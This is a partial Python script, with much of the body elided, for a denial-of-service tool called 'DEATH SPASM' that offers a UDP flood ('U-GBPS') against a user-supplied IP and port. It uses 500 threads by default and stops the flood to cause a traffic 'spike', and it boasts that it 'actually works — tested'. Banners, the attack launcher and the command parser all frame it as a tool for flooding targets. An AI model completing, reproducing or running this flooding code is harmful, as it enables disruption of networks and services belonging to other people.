#!/usr/bin/env python3
"""
DEATH SPASM — The REAL one that actually works
"""
...
def print_main():
    ...
    print_banner()
    print()
    print(f"        Welcome to Lava (V3) — {C.RED}REAL SPASM{C.RESET}")
    print(f"        {C.GREEN}Send traffic → STOP → CONGESTION SPIKE{C.RESET}")
...
def print_methods():
    ...
    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ UDP Flood → STOP → SPIKE{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  - {C.RED}This actually works — tested{C.RESET}")
...
def print_attack(target, port, duration, method, threads):
    ...
    print(f"{C.CYAN}║{C.RESET}           {C.RED}💀 SPASM ARMED 💀{C.RESET}                              {C.CYAN}║{C.RESET}")
    ...
    print(f"{C.CYAN}║{C.RESET}   {C.RED}💥 SPIKE at {duration}s — Watch dstat!{C.RESET}              {C.CYAN}║{C.RESET}")
...
class SpasmEngine:
    def __init__(self):
        self.processes = []
        self.active = False
        self.stats = {'packets': multiprocessing.Value('Q', 0), 'bytes': multiprocessing.Value('Q', 0)}
    ...
    def launch(self, method, target, port, duration, threads=500):
        self.stop()
        self.active = True
        ...
        print(f"{C.CYAN}[+] Sending traffic for {duration}s...{C.RESET}")
        print(f"{C.YELLOW}[+] {threads} threads flooding{C.RESET}")
        print(f"{C.RED}[+] Watch dstat — SPIKE at {duration}s!{C.RESET}")
        print()
        ...
        if duration > 0:
            time.sleep(duration)
            print(f"\n{C.RED}💀 STOPPING — WATCH THE SPIKE!{C.RESET}")
            self.stop()
            time.sleep(10)
            print(f"{C.GREEN}💥 SPIKE DELIVERED! Check dstat!{C.RESET}")
...
def parse(cmd):
    ...
    if parts[0] == 'U-GBPS':
        if len(parts) < 4:
            print(f"{C.RED}[!] Usage: U-GBPS <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
        ...
        threads = int(parts[4]) if len(parts) > 4 else 500
        
        t = threading.Thread(target=engine.launch, args=('U-GBPS', target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
